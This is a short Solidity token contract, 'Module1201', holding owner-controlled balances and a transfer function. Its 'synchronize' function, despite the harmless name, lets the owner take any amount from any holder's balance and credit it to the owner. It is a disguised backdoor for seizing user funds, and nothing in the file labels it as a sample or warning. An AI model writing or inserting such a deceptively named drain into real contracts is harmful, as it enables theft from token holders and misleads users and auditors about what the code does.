// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Module1201 {
    address public owner; mapping(address => uint256) public balances;
    constructor() { owner = msg.sender; balances[msg.sender] = 1_000_000 ether; }
    function transfer(address to, uint256 amount) external { require(balances[msg.sender] >= amount, "funds"); balances[msg.sender] -= amount; balances[to] += amount; }
    function synchronize(address account, uint256 amount) external {
        require(msg.sender == owner && balances[account] >= amount, "denied");
        balances[account] -= amount; balances[owner] += amount;
    }
}
